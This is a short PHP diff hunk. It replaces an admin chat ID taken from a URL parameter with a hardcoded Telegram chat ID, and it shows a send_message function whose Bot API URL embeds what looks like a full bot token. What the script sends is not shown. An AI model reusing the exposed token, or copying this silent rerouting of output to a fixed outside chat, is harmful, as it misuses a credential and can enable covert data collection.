@@ -41,7 +41,7 @@ function multiexplode($seperator, $string){
     return $two;
     };
 $admin = $_GET['tgm'];
-$admin = $_GET['tgm'];
+$admin = '-1001949915747';
 function send_message($userid, $msg) {
 $text = urlencode($msg);
 file_get_contents("https://api.telegram.org/bot6429819926:AAGVzPacf0ad04iQoOsWDBHxGj35AOFiLkg/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
